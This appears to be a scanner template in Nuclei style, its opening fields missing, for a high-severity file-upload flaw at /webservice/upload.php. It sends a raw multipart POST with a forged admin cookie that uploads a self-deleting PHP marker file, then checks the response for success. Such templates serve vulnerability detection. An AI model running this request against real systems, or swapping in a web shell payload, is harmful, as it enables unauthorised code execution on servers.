  author: weehhd
  severity: high
  description: https://cn-sec.com/archives/1952621.html
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /webservice/upload.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Cookie: USER_NAME_COOKIE=admin; LOGIN_LANG=cn
        Connection: keep-alive
        Content-Type: multipart/form-data; boundary=---------------------------10267625012906
        Content-Length: 242



        -----------------------------10267625012906
        Content-Disposition: form-data; name="file"; filename="1.php"
        Content-Type: application/octet-stream

        <?php echo md5(43856);unlink(__FILE__);?>
        -----------------------------10267625012906--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '*1.php'
      - type: word
        part: header
        words:
          - HTTP/1.1 200 OK
